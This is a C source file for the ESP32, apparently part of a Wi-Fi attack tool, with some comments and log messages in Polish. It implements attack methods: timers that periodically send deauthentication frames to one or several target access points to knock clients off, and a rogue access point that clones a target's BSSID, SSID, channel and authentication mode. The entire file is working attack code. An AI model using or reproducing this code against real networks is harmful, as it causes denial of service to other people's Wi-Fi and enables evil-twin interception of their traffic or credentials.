/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Callback for periodic deauthentication frame timer
 * Periodicaly called to send deauthentication frame for given AP
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

/**
 * @brief Callback for periodic deauthentication frame timer
 * Periodicaly called to send deauthentication frame for given AP
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame_multiple_aps(void *arg){
    WifiApList * wifiApList = (WifiApList *) arg;

    if (wifiApList == NULL || wifiApList->ap_records == NULL) {
        ESP_LOGW(TAG, "Brak danych do wypisania.");
        return;
    }

    ESP_LOGI(TAG, "Lista zapisanych punktów dostępowych (%zu):", wifiApList->count);
    for (size_t i = 0; i < wifiApList->count; i++) {
        ESP_LOGI(TAG, "AP %zu: SSID: %s, Kanał: %d", 
                 i + 1, 
                 (char*) wifiApList->ap_records[i].ssid, 
                 wifiApList->ap_records[i].primary);  
    }



    wsl_bypasser_send_deauth_frame_multiple_aps(wifiApList->ap_records, wifiApList->count);
}


/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 * Supports more than one AP in the same timer. Changes channels on the fly.
 */
void attack_method_broadcast_multiple_ap(const wifi_ap_record_t ap_recordss[], size_t count, unsigned period_sec){
    ESP_LOGI(TAG, "attack_method_broadcast invoked!");
    ESP_LOGI(TAG, "attack_method_broadcast invoked, count: %d", count);

    for (size_t i = 0; i < count; i++) {

        const wifi_ap_record_t *ap_recordP = &ap_recordss[i];  // Bez kopiowania
        ESP_LOGI(TAG, "DEBUG BEFORE TIMER SSID: %s", ap_recordP->ssid);
        ESP_LOGI(TAG, "DEBUG BEFORE TIMER CHANNEL: %d", ap_recordP->primary);
        ESP_LOGI(TAG, "DEBUG BEFORE TIMER BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
            ap_recordP->bssid[0], ap_recordP->bssid[1], ap_recordP->bssid[2],
            ap_recordP->bssid[3], ap_recordP->bssid[4], ap_recordP->bssid[5]);
    }

    WifiApList *ap_list = (WifiApList *) malloc(sizeof(WifiApList)); // Alokacja na stercie
    if (ap_list == NULL) {
        ESP_LOGE(TAG, "Nie udało się przydzielić pamięci dla WifiApList!");
        return;
    }

    // Alokujemy pamięć dla tablicy ap_records na stercie
    ap_list->ap_records = (wifi_ap_record_t *) malloc(count * sizeof(wifi_ap_record_t));
    if (ap_list->ap_records == NULL) {
        ESP_LOGE(TAG, "Nie udało się przydzielić pamięci dla ap_records!");
        free(ap_list);
        return;
    }

    // Kopiujemy zawartość tablicy `ap_recordss` do nowej pamięci
    memcpy(ap_list->ap_records, ap_recordss, count * sizeof(wifi_ap_record_t));
    ap_list->count = count; // Przypisujemy liczbę APs


    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame_multiple_aps,
        .arg = (void *) ap_list
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}


/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){

    ESP_LOGI(TAG, "attack_method_broadcast invoked, SSID: %s", ap_record->ssid);

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    memcpy(ap_config.sta.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
}